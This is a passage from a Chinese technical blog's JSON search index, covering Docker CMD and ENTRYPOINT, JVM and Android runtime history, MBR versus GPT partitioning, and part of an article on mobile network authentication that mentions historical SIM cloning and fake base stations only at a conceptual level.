href=\"https://docs.docker.com/engine/reference/builder/#cmd\">链接</a></p>\n<ol>\n<li><p>主要目的</p>\n<ul>\n<li>提供默认的命令</li>\n<li>提供默认的参数，与ENTRYPOINT协同作用</li>\n<li>如果一个容器每次都要运行同一个可执行文件，推荐使用ENTRYPOINT</li>\n<li>该方式的命令，会被<code>docker run image cmd arg1 arg2</code>命令行方式覆盖</li>\n<li>dockerfile 中最后一个CMD参数才会生效</li>\n</ul>\n</li>\n<li><p>格式</p>\n</li>\n</ol>\n<p>exec form(推荐的方式): <code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code><br>最终会被解析成json array， 必须有双引号<br>不提供shell环境，[“echo”, “$HOME”], HOME不会像shell一样解析<br>executable 要使用绝对路径<br>default parameters to ENTRYPOINT: CMD [“param1”,”param2”]<br>shell form: CMD command param1 param2 (shell form) 最好不要用<br>命令解析成： <code>/bin/sh -c command param1 param2</code></p>\n<h2 id=\"ENTRYPOINT\"><a href=\"#ENTRYPOINT\" class=\"headerlink\" title=\"ENTRYPOINT\"></a>ENTRYPOINT</h2><p><a href=\"https://docs.docker.com/engine/reference/builder/#entrypoint\">链接</a></p>\n<ol>\n<li><p>主要目的</p>\n<ul>\n<li>将镜像作为一个可执行文件，就像命令一样启动，无须指定命令：docker run -i -t –rm -p 80:80 nginx</li>\n<li>ENTRYPOINT 命令参数的来源：<br>dockerfile 中CMD的参数<br>docker run命令行后面的参数列表。如<code>docker run &lt;image&gt; -d -c</code>, -d -c 将作为参数会给entrypoint。<br>一般镜像都是以CMD多于ENTRYPOINT: 因为用cmd，docker run image cmd arg1 arg2, 可以很方便覆盖默认的命令，如果镜像是以ENTRYPOINT做为最终的执行命令，必须用 –entrypoint cmd 。 eg: d run –entrypoint &#x2F;bin&#x2F;sh -it xxx_image -c “echo hello”<br>dockerfile 中最后一个ENTRYPOINT才会生效</li>\n</ul>\n</li>\n<li><p>格式</p>\n<p> exec form(推荐方式): ENTRYPOINT [“executable”, “param1”, “param2”]<br> shell form: ENTRYPOINT command param1 param2<br> 以&#x2F;bin&#x2F;sh -c 的形式运行命令<br> 会忽略signal信号，docker stop 无法停止<br> 坑较多，不要用<br> ENTRYPOINT vs CMD</p>\n<p> <a href=\"https://docs.docker.com/engine/reference/builder/#understand-how-cmd-and-entrypoint-interact\">asd</a></p>\n</li>\n</ol>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>用最简单的方式 CMD [“cmd”, “arg1”, “arg2”]<br>其他方式坑太多，细节太多</p>\n"},{"title":"深入理解Java虚拟机 - 以Android为例","url":"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/","content":"<p>Java语言的最大优势就是<strong>一次编译，处处运行</strong>的特性，通过<code>javac</code>编译器将源代码编译成通用的中间形式——字节码，然后再由<code>java</code>解释器逐条将字节码解释为机器码来执行。尽管在性能上，Java远不如C++这类编译型语言，但由于良好的平台移植性而大行其道，其中的关键技术就是<strong>Java虚拟机</strong>。</p>\n<h2 id=\"一、什么是JVM\"><a href=\"#一、什么是JVM\" class=\"headerlink\" title=\"一、什么是JVM\"></a>一、什么是JVM</h2><p><code>JVM（Java Virtual Machine）</code>是一台虚拟的计算机，本质上通过定义一组技术规范，在物理的计算机上模拟实现各种功能。<br>JVM屏蔽了与具体操作系统平台相关的信息，使Java程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行，属于用户态。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/jvm.png\" class=\"\">\n\n<p>Java虚拟机包括一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域。详细资料请参见<a href=\"https://cloud.tencent.com/developer/article/1556672\">jvm原理</a>。</p>\n<p>Java Community Process组织管理所有Java技术标准，主要途径是发布JSR - Java Specification Requests，Java虚拟机也不例外。<br>JVM涉及的核心技术规范包括：</p>\n<ul>\n<li>2004年，发布的JVM核心规范<a href=\"https://www.jcp.org/en/jsr/detail?id=924\">JSR 924 - Java Virtual Machine Specification</a></li>\n<li>2006年，为修订Class文件标准而发布的<a href=\"https://web.archive.org/web/20120226185155/http://www.jcp.org/en/jsr/detail?id=202\">JSR 202 - Java Class File Specification Update</a></li>\n<li>完整的Java虚拟机描述，可以参见<a href=\"https://web.archive.org/web/20110925050249/http://java.sun.com/docs/books/vmspec/2nd-edition/html/VMSpecTOC.doc.html\">JCP发布的JVM蓝皮书</a></li>\n</ul>\n<h2 id=\"二、JVM的运行模式\"><a href=\"#二、JVM的运行模式\" class=\"headerlink\" title=\"二、JVM的运行模式\"></a>二、JVM的运行模式</h2><p>以最常见的<code>Oracle JDK</code>为例，我们可以查看其版本信息如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">bogon:~ sj$ java -version</span><br><span class=\"line\">java version &quot;15.0.2&quot; 2021-01-19</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 15.0.2+7-27)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 15.0.2+7-27, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<p>其中，JVM使用的引擎是<code>HotSpot</code>，基于<code>Server</code>版本，使用<code>Mixed mode</code>混合模式。</p>\n<blockquote>\n<p>Server模式启动采用重量级的虚拟机，对代码进行更多的优化；而Client模式采用轻量级的虚拟机，启动速度更快。<br>    尽管Server启动慢，但稳定后的运行速度比Client远远要快。<br>    64位版本默认都采用Server模式。</p>\n</blockquote>\n<p><code>Bytecode</code>被称为字节码，是因为字节码文件由十六进制值组成，而<code>JVM</code>以两个十六进制值为一组，即以字节为单位进行读取。在Java中一般是用<code>javac</code>命令编译源代码为字节码文件，一个.java文件从编译到运行的示例如图1所示。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/java-2.png\" class=\"\">\n\n<p>为了优化Java的性能 ，JVM在解释器之外引入了即时（Just In Time）编译器：当程序运行时，解释器首先发挥作用，代码可以直接执行。随着时间推移，即时编译器逐渐发挥作用，把越来越多的代码编译优化成本地代码，来获取更高的执行效率。解释器这时可以作为编译运行的降级手段，在一些不可靠的编译优化出现问题时，再切换回解释执行，保证程序可以正常运行。</p>\n<p>即时编译器极大地提高了Java程序的运行速度，而且跟静态编译相比，即时编译器可以选择性地编译热点代码，省去了很多编译时间，也节省很多的空间。目前，即时编译器已经非常成熟了，在性能层面甚至可以和编译型语言相比。不过在这个领域，大家依然在不断探索如何结合不同的编译方式，使用更加智能的手段来提升程序的运行速度。</p>\n<h2 id=\"三、Android的虚拟机技术演进\"><a href=\"#三、Android的虚拟机技术演进\" class=\"headerlink\" title=\"三、Android的虚拟机技术演进\"></a>三、Android的虚拟机技术演进</h2><p>Apple基于软硬件一体化的商业模式，很自然地选择<code>Object C</code>作为iPhone的开发语言，并获得了更为优秀的性能。<br>反之，由于Google自身并不生产硬件设备，Android必须面对如何适配不同硬件平台的难题，采用Java技术标准几乎是唯一的解决方案。</p>\n<p>在分析Android虚拟机之前，我们先明确几个概念：</p>\n<ul>\n<li><code>APK</code> - Android Package: Android应用的安装包，本质是一个zip打包文件，其中多个目录分别存储：DEX执行文件、资源文件和系统配置文件</li>\n<li><code>DEX</code> - Dalvik EXecutable: Android Dalvik的可执行文件，注意，其基于Dalvik字节码，并非Java的标准字节码</li>\n<li><code>ART</code> - Android Runtime: Android 运行时环境</li>\n</ul>\n<p>实际上，开发Android应用开发的路径是：**.java文件 -&gt; .class文件 -&gt; .dex文件**。</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/dex.png\" class=\"\">\n\n<p>开发者基于Java语言开发源代码文件，然后编译成Java字节码文件，再使用转换工具<code>dx</code>转换为DEX字节码文件，最后在Dalvik虚拟机中执行（可能是解释方式，也可能编译模式）。</p>\n<h3 id=\"1-早期的Dalvik虚拟机\"><a href=\"#1-早期的Dalvik虚拟机\" class=\"headerlink\" title=\"1. 早期的Dalvik虚拟机\"></a>1. 早期的Dalvik虚拟机</h3><p>Dalvik是Google公司自己设计用于Android平台的虚拟机，在Android 5.0之前采用，其基本演进路线是：</p>\n<ul>\n<li>2008年，Android发布，Dalvik VM的执行引擎是只有解释器的；</li>\n<li>2010年，Android 2.2发布，Dalvik VM引入了JIT编译器，JIT的引入使得Dalvik的性能提升了3～6倍；</li>\n<li>2013年，Android 4.4发布，Dalvik和ART并存；</li>\n</ul>\n<p>Dalvik VM的设计思想与Java虚拟机相似，但并不遵循JVM规范来实现，存在着明显的差异：</p>\n<ol>\n<li>基于寄存器的技术实现，而非基于栈<br> DVM是基于寄存器的，它没有基于栈的虚拟机在拷贝数据而使用的大量的出入栈指令，同时指令更紧凑更简洁；<br> 但是，由于显示指定了操作数，所以基于寄存器的指令会比基于栈的指令要大，但是由于指令数量的减少，总的代码数不会增加多少。</li>\n<li>自定义的字节码<br> Dalvik 有 218 个操作码，它们与 Java 中的 200 个操作码有本质的不同。<br> 例如，有十几种操作码用于在堆栈和局部变量列表之间传输数据，而在 Dalvik 中完全没有。</li>\n<li>Class类加载方式不同<br> 标准Java应用开发提交的是<code>.jar</code>文件，JVM将<strong>动态加载</strong>其中包含的全部<code>.class</code>文件，每个.class文件里面包含了该类的常量池、类信息、属性等。<br> 对于Android，其通过dx工具将所有的<code>.class</code>文件合并、精简并转换为单一的<code>.dex</code>文件，然后交给DVM执行，既减少了I&#x2F;O操作，又提高了运行速度。</li>\n<li>多实例并发能力<br> 针对手机终端有限的内存和计算能力，DVM允许同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux进程执行，防止在虚拟机崩溃的时候所有程序都被关闭。<br> 具体来说，DVM由Zygote创建和初始化，每当系统需要创建一个应用程序时，Zygote就会fork自身，快速地创建和初始化一个DVM实例，用于应用程序的运行。</li>\n</ol>\n<p>Dalvik VM的主要问题是性能！<br>早期的纯解释器执行显然速度慢，Android 2.2加入了JIT编译器，采用了解释器+JIT编译的方式，虽然运行性能提升了，可是每次启动应用都需要动态编译生成机器码，这会拖慢应用的启动速度。</p>\n<h3 id=\"2-中期的ART虚拟机\"><a href=\"#2-中期的ART虚拟机\" class=\"headerlink\" title=\"2. 中期的ART虚拟机\"></a>2. 中期的ART虚拟机</h3><ul>\n<li>2013年，Android 4.4引入了ART VM，改为AOT - Ahead Of Time的编译模式（静态编译）。<br>  其运行模式是：应用在第一次安装的时候，字节码就会预先编译成机器码，使其成为真正的本地应用；之后打开App的时候，不需要额外的翻译工作，直接使用本地机器码运行。</li>\n<li>2014年，Android 5.0发布，ART取代了Dalvik成为了VM，同时AOT也成为了唯一的编译模式。</li>\n</ul>\n<p>对比Dalvik，ART是安装的时候就编译好了，执行的时候直接运行机器码，开启应用速度明显提高。</p>\n<blockquote>\n<p>有一段时间，Huawei手机总是提示<strong>正在进行APP优化</strong>，其实就是编译生成机器码。</p>\n</blockquote>\n<p>但是，ART的缺点也是明显的，一是应用安装的时间长，二是消耗更多的存储空间，因为需要持久化保存机器码。</p>\n<h3 id=\"3-全新的Hybrid模式-Interpreter-JIT-AOT\"><a href=\"#3-全新的Hybrid模式-Interpreter-JIT-AOT\" class=\"headerlink\" title=\"3. 全新的Hybrid模式(Interpreter + JIT + AOT)\"></a>3. 全新的Hybrid模式(Interpreter + JIT + AOT)</h3><p>2016年，Android N 引入了一种包含编译、解释和 JIT（Just In Time）的混合运行时，以便在安装时间、内存占用、电池消耗和性能之间获得最好的折衷.<br>这种混合模式仍被简称为 AOT，但是其含义变成“全时段的编译”（All-Of-the-Time compilation）</p>\n<img src=\"/2021/11/14/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Java%E8%99%9A%E6%8B%9F%E6%9C%BA%20-%20%E4%BB%A5Android%E4%B8%BA%E4%BE%8B/Android-N.png\" class=\"\">\n\n<p>其主要特征为：</p>\n<ol>\n<li>在App第一次启动的时候，系统会直接以Intercept的方式来运行，以便快速启动；</li>\n<li>在App第一次启动的同时，启动<code>Compilation Daemon Service</code>服务，负责在系统空闲的时候，后台ART针对<strong>热代码</strong>进行静态编译，其他代码不做编译;</li>\n<li>ART包含了一个新的、更快的JIT解释器，负责动态生成机器码，但并不是进行持久化存储；</li>\n<li>代码在执行期间被分析函数调用情况，分析结果保存在<code>Profile</code>文件中，以便未来生成AOT，这就是<code>Profile Guided AOT</code>；</li>\n<li>ART采用了深度内联等几种更高级的技巧，对代码进行更深度的优化。</li>\n</ol>\n<p>这种混合使用 AOT、解释、JIT 的策略的全部优点如下</p>\n<ul>\n<li>即使是大应用，安装时间也能缩短到几秒</li>\n<li>系统升级能更快地安装，因为不再需要优化这一步</li>\n<li>应用的内存占用更小，有些情况下可以降低 50%</li>\n<li>改善了性能</li>\n<li>更低的电池消耗</li>\n</ul>\n<h2 id=\"四、结论\"><a href=\"#四、结论\" class=\"headerlink\" title=\"四、结论\"></a>四、结论</h2><ol>\n<li>与Javascript V8引擎相似，Android虚拟机也走向了混合编译模式。</li>\n<li>华为的方舟编译器，宣称抛弃了虚拟机，全部采用机器码，支持Java和C++的混合编译，但又宣称自主设计了统一的中间表示MapleIR，后续可以深入研究与Java的关系？</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方网站\"><a href=\"#官方网站\" class=\"headerlink\" title=\"官方网站\"></a>官方网站</h3><ul>\n<li><a href=\"https://web.archive.org/web/20110925050249/http://java.sun.com/docs/books/vmspec/2nd-edition/html/VMSpecTOC.doc.html\">JCP发布的Java Virtual Machine蓝皮书</a></li>\n<li><a href=\"https://developer.android.com/reference/dalvik/bytecode/Opcodes.html\">Android Dalvik 的字节码清单</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Comparison_of_Java_virtual_machines\">主流Java Virtual Machine的技术对比 - Wiki主页</a></li>\n<li>《深入理解Java虚拟机：JVM高级特性与最佳实践》 周志明 著</li>\n</ul>\n<h3 id=\"技术研究\"><a href=\"#技术研究\" class=\"headerlink\" title=\"技术研究\"></a>技术研究</h3><ul>\n<li><a href=\"https://blog.csdn.net/zhongyili_sohu/article/details/106555297\">一文让你搞懂各种虚拟机、解释器、JIT和AOT编译器</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/34426768\">关于Jvm知识看这一篇就够了</a></li>\n<li><a href=\"https://tech.meituan.com/2020/10/22/java-jit-practice-in-meituan.html\">Java即时编译器原理解析及实践 - 美团技术</a></li>\n<li><a href=\"https://tech.youzan.com/qian-tan-android-dexwen-jian/\">浅谈 Android Dex 文件 - 有赞技术</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1445764\">Android虚拟机的JIT编译器</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000040710467\">Dalvik 和 Java 字节码的比较</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1663852\">一文读懂 DEX 文件格式解析</a></li>\n<li><a href=\"https://bbs.huaweicloud.com/blogs/detail/105435\">首次全面深度解密华为方舟编译器</a></li>\n</ul>\n"},{"title":"硬盘分区表之MBR和GPT","url":"/2020/06/20/%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA%E8%A1%A8%E4%B9%8BMBR%E5%92%8CGPT/","content":"<h2 id=\"名词解释\"><a href=\"#名词解释\" class=\"headerlink\" title=\"名词解释\"></a>名词解释</h2><p>磁盘管理模式：</p>\n<ul>\n<li><p>MBR（Master Boot Record）：即硬盘的主引导记录分区列表，在主引导扇区，位于硬盘的cylinder 0， head 0， sector 1 （Sector是从1开始的）。</p>\n</li>\n<li><p>GPT（GUID Partition Table）：即全局唯一标识分区列表，是一个物理硬盘的分区结构。它用来替代BIOS中的主引导记录分区表（MBR）。</p>\n</li>\n</ul>\n<p>主板接口标准：</p>\n<ul>\n<li><p>BIOS（Basic Input Output System）：它的全称应该是ROM－BIOS，意思是只读存储器基本输入输出系统。其实，它是一组固化到计算机内主板上一个ROM芯片上的程序，它保存着计算机最重要的基本输入输出的程序、系统设置信息、开机上电自检程序和系统启动自举程序。 其主要功能是为计算机提供最底层的、最直接的硬件设置和控制。</p>\n</li>\n<li><p>UEFI（Unified Extensible Firmware Interface)：全称“统一的可扩展固件接口”， 是一种详细描述全新类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上，从而使开机程序化繁为简，节省时间。</p>\n</li>\n</ul>\n<h2 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h2><p>MBR是传统的分区表类型，最大的缺点则是不支持容量大于2T的硬盘。GPT则弥补了MBR这个缺点，最大支持18EB的硬盘，是基于UEFI使用的磁盘分区架构。</p>\n<p>传统BIOS主要支持MBR引导，UEFI则是取代传统BIOS，它加入了对新硬件的支持，其中就有2TB以上硬盘。</p>\n<p>目前所有Windows系统均支持MBR，而GPT只有64位系统才能支持。BIOS只支持MBR引导系统，而GPT仅可用UEFI引导系统。正因为这样，现在主板大多采用BIOS集成UEFI，或UEFI集成BIOS，以此达到同时兼容MBR和GPT引导系统的目的。</p>\n<p>UEFI启动引导系统的方法是查找硬盘分区中第一个FAT分区内的引导文件进行系统引导，这里并无指定分区表格式。所以U盘和移动硬盘可以用MBR分区表，创建一个FAT分区放置引导文件，从而达到可以双模式启动的目的。但需要注意的是，UEFI虽然支持MBR启动，但必须要有UEFI引导文件存放在FAT分区下；UEFI是无法使用传统MBR引导来启动系统的。</p>\n<p>由于GPT引导系统的方式与MBR不同，故而使用传统系统安装办法（如Ghost、Win$Man等）会导致出现系统无法引导的现象。而且使用GPT引导系统的话，必要时还得调整主板设置，开启UEFI（大部分主板默认开启UEFI）。但是使用UEFI和GPT，只是支持大于容量2T的硬盘，并不会带来质的提升（开机硬件自检会稍微快了那么1、2秒）。所以，如果不用大于2T的硬盘做系统的话，就没必要使用UEFI。</p>\n<ul>\n<li><p>BIOS+MBR：这是最传统的，系统都会支持；唯一的缺点就是不支持容量大于2T的硬盘。</p>\n</li>\n<li><p>BIOS+GPT：BIOS是可以使用GPT分区表的硬盘来作为资料盘的，但不能引导系统；若电脑同时带有容量小于2T的硬盘和容量大于2T的硬盘，小于2T的可以用MBR分区表安装系统，而大于2T的可以使用GPT分区表来存放资料。但系统须使用64位系统。</p>\n</li>\n<li><p>UEFI+MBR：可以把UEFI设置成Legacy模式（传统模式）让其支持传统MBR启动，效果同BIOS+MBR；也可以建立FAT分区，放置UEFI启动文件来，可应用在U盘和移动硬盘上实现双模式启动。</p>\n</li>\n<li><p>UEFI+GPT：如果要把大于2T的硬盘作为系统盘来安装系统的话，就必须如此。而且系统须使用64位系统，否则无法引导。但系统又不是传统在PE下安装后就能直接使用的，引导还得经过处理才行。</p>\n</li>\n</ul>\n<h2 id=\"实际案例\"><a href=\"#实际案例\" class=\"headerlink\" title=\"实际案例\"></a>实际案例</h2><p>Ubuntu安装完成后，主机硬盘的默认分区表为GPT格式（不是MBR格式），包含了两个分区，其中：</p>\n<ul>\n<li><code>/dev/sda1</code>：用于EFI启动，512M</li>\n<li><code>/dev/sda2</code>：Linunx系统盘</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# fdisk -l</span><br><span class=\"line\">Disk /dev/loop0: 89.1 MiB, 93417472 bytes, 182456 sectors</span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disk /dev/sda: 111.8 GiB, 120034123776 bytes, 234441648 sectors</span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disklabel type: gpt</span><br><span class=\"line\">Disk identifier: D8D94899-BC23-4D81-96EB-ECAFE4710A7E</span><br><span class=\"line\"></span><br><span class=\"line\">Device       Start       End   Sectors   Size Type</span><br><span class=\"line\">/dev/sda1     2048   1050623   1048576   512M EFI System</span><br><span class=\"line\">/dev/sda2  1050624 234438655 233388032 111.3G Linux filesystem</span><br></pre></td></tr></table></figure>\n"},{"title":"移动通信网的鉴权认证技术","url":"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/","content":"<p>先给个总体演进图。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/vs.png\" alt=\"VS\"></p>\n<h2 id=\"一、基本概念\"><a href=\"#一、基本概念\" class=\"headerlink\" title=\"一、基本概念\"></a>一、基本概念</h2><p>移动通信网通常由三个部分组成，即核心网 (CN，core network)、无线接入网(RAN，radio access network)和用户设备(UE，user equipment)。 其中移动用户设备属于用户个人，由用户直接控制，接入网与核心网属于运营商，由运营商直接控制。如果用户希望使用运营商服务和网络资源，需要用户和运营商共同协商，这就涉及鉴权认证，判明和确认通信双方真实身份。</p>\n<p>移动通信网的鉴权认证过程采用的是古老的“Challenge - Response”（挑战 - 响应）的机制，即认证方向被认证方发送一个“挑战”（一般是一个随机数），被认证方基于双方共有密钥，以及挑战中所包含的信息计算一个“响应”。显然，只有拥有密钥的参与方才能正确计算出这个响应。</p>\n<blockquote>\n<p>一般情况下，认证可基于被认证方拥有一个独特的、不可复制的构件；或者双方都知道的一个秘密；又或者被认证方的某种唯一特征。<br>除第一代模拟通信外，从2G开始的移动通信网络的认证综合了前两种方式：一个共同的秘密（密钥）和被认证方一个独特的构件（SIM&#x2F;USIM卡）。</p>\n</blockquote>\n<p>移动通信网的鉴权认证是移动网络与终端用户之间相互识别的过程，核心是解决两个问题：</p>\n<ol>\n<li><p><strong>你是谁?</strong><br> 基于国际移动用户识别号 IMSI（International Mobile Subscriber Identification）。<br> IMSI 定义为 15 位的十进制数，其结构为：MCC + MNC + MSIN。<br> 全球运营商统一编码，是唯一且固定的身份标识，SIM&#x2F;USIM 卡中存储了该数据。</p>\n</li>\n<li><p><strong>你是不是你?</strong><br> 基于永久性的根密钥 Ki，长度是 16 个字节，也就是 128 比特位。<br> 认证就是基于 Ki 共同秘密，配合一些其他的参数，基于一定的认证算法和协议过程而展开。<br> Ki 仅在运营商的 AUC（Authentication Center）和用户的 SIM&#x2F;USIM 卡中存储，基于根密钥的计算都在内部进行，绝对不允许对外暴露。<br> 后续需要使用的其它密钥（例如通信密钥 Kc），都是基于 Ki 通过不可逆的算法衍生出来的。</p>\n</li>\n</ol>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/GSM-arch.jpg\" alt=\"GSM\"></p>\n<p>AUC 和 SIM&#x2F;USIM 是移动通信网安全的基石之一。AUC在运营商网络之内，在物理上、管理机制上、安全防护手段上都有严格的要求，卡则散落在用户手里，是不可控的环境。通常卡都采用抵制篡改（tamper-resist）的硬件设计，即要求不能从卡内读出卡内的信息，从而防止信息的泄露。</p>\n<h2 id=\"二、GSM-的-鉴权流程\"><a href=\"#二、GSM-的-鉴权流程\" class=\"headerlink\" title=\"二、GSM 的 鉴权流程\"></a>二、GSM 的 鉴权流程</h2><h3 id=\"1-三元组认证向量（RAND、XRES、Kc）\"><a href=\"#1-三元组认证向量（RAND、XRES、Kc）\" class=\"headerlink\" title=\"1. 三元组认证向量（RAND、XRES、Kc）\"></a>1. 三元组认证向量（RAND、XRES、Kc）</h3><p>GSM 系统的鉴权流程在 GSM09.02 MAP 中定义，核心是三元组认证向量（RAND、XRES、Kc）。</p>\n<ul>\n<li>RAND：移动网络AUC提供的随机数</li>\n<li>XRES&#x2F;SRES：AUC侧计算的期望响应值（eXperted RESponse），卡侧计算的鉴权响应值（Signed RESponse），检测 XRES &#x3D;&#x3D; SRES</li>\n<li>Kc：通信使用的一次性会话密钥，用于 A5 算法的加密输入</li>\n</ul>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/GSM.jpeg\" alt=\"GSM\"></p>\n<p>在这个6步的过程里面同时实现了认证和会话密钥协商，称为AKA（Authentication and Key Agreement，会话与密钥协商）协议。</p>\n<h3 id=\"2-COMP128-1-算法和克隆卡问题\"><a href=\"#2-COMP128-1-算法和克隆卡问题\" class=\"headerlink\" title=\"2. COMP128-1 算法和克隆卡问题\"></a>2. COMP128-1 算法和克隆卡问题</h3><p>AKA 协议定义了 A3 和 A8 算法，其中 A3 算法以 Ki 和 RAND 作为输入参数，负责生成 SRES（32bits），A8 算法同样以 Ki 和 RAND 作为输入参数，负责生成后续用于通信加密的会话密钥 Kc（64bits）。由于这两个算法的输入参数完全相同，绝大多数运营商都直接采用 COMP128-1算法。</p>\n<p>COMP128-1 算法于1987年设计，1991年投入使用，其设计较为简单，其实现仅需20行代码，在最初设计与使用时，所有参与方签订协议对方法进行保密。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/comp128-struct.jpg\" alt=\"COMP128\"></p>\n<blockquote>\n<p>R 为轮函数，P 为置换，F 为置换与抽取。由于R、P、F均为高强度非线性运算，整体呈现哈希的雪崩特性。</p>\n</blockquote>\n<p>1998年，COMP128-1 算法被泄露，随即在1999年即被破解。究其原因，由于COMP128-1 算法中输入的信息（128bits）大于输出的信息（96bits,即SRES+Kc），因此必然会出现不同的输入产生相同的输出，也就是“碰撞”，而且由于字节压缩得很厉害，很容易找到“碰撞”。</p>\n<p>2000年，出现了对应的SIM卡破解软件，攻击者输入大量连续的数据就能轻易获得碰撞，以此来推算出密钥Ki。一旦计算出Ki，SIM卡就可被复制。因此，对SIM卡的破解并不是从智能卡中读取了机密信息，而是利用算法的脆弱性实施了计算破解。</p>\n<h3 id=\"3-单向鉴权和伪基站问题\"><a href=\"#3-单向鉴权和伪基站问题\" class=\"headerlink\" title=\"3. 单向鉴权和伪基站问题\"></a>3. 单向鉴权和伪基站问题</h3><p>GSM 认证机制最大的缺陷是“单向认证”，就是说只有网络认证用户的真实性，而用户不认证网络。</p>\n<p>2009年，OpenBTS软件发布，攻击者购置主机和笔记本电脑，再加上一个射频装置，通过<strong>中间人攻击</strong>方式构造“伪基站”，其基本流程是：</p>\n<ul>\n<li>伪基站设备发射高强度的非法信号，用户终端自动连接到信号强度最高的基站并发送注册请求，这便暴露了自己的 IMSI</li>\n<li>伪基站设备侦听设备，冒充目标终端向运营商真实网络侧发起注册请求</li>\n<li>伪基站设备把网络下发的 RAND 转给受害者移动终端，并把终端返回的 SRES 转给网络，这就完成了鉴权认证流程</li>\n</ul>\n<p>理论上说，如果伪基站接入了运营商网络，可以解析信令数据并通过 A5 算法解密话音数据，从而实现主叫通话的窃听功能（此时无法做被叫，因为终端未在公众通信网络注册），但由于这些功能实现较为复杂，实际上典型的犯罪应用是短信欺诈，即伪装成任意号码（例如95588、95533、10086等银行或通信运营商的客服号码）下发垃圾短信，或者伪造短信验证码。</p>\n<h2 id=\"三、CDMA-的鉴权流程\"><a href=\"#三、CDMA-的鉴权流程\" class=\"headerlink\" title=\"三、CDMA 的鉴权流程\"></a>三、CDMA 的鉴权流程</h2><p>CDMA 系统的鉴权流程在 IS-41 MAP 中被详细定义。<br>CDMA 系统中用于移动台鉴权的密码分为两级，第一级为移动台的密钥 A_Key，第二级为共享加密数据(SSD，shared secret data)。</p>\n<ul>\n<li>密钥 A_Key是高级密码，长度为 64 bit，由运营商分配，它和 IMSI 一同被写入移动终端永久性存储器中。<br>  同时，运营商核心网存储该用户的 IMSI 和对应的 A_Key。该密钥是永久性的，不在网络和空中信道上传播。</li>\n<li>SSD 是低级密码，长为 128 bit(分为 SSD_A 为 64 bit 和 SSD_B 为 64 bit)，它由A_Key 运算产生，存在于移动台、鉴权中心和拜访者位置寄存器。<br>  在鉴权过程中，核心网使用RAND 和 SSD_A 计算出期望的响应 AUTHx，倘若移动终端计算的 AUTHx(用 RAND 和 SSD_A计算所得)和核心网计算的 AUTHx 相同，则鉴权成功，攻击者因没有正确有效的 SSD 值，无法计算得到核心网所期望的 AUTHx 值导致鉴权 失败]。</li>\n</ul>\n<h2 id=\"四、3G（UTMS）的鉴权流程\"><a href=\"#四、3G（UTMS）的鉴权流程\" class=\"headerlink\" 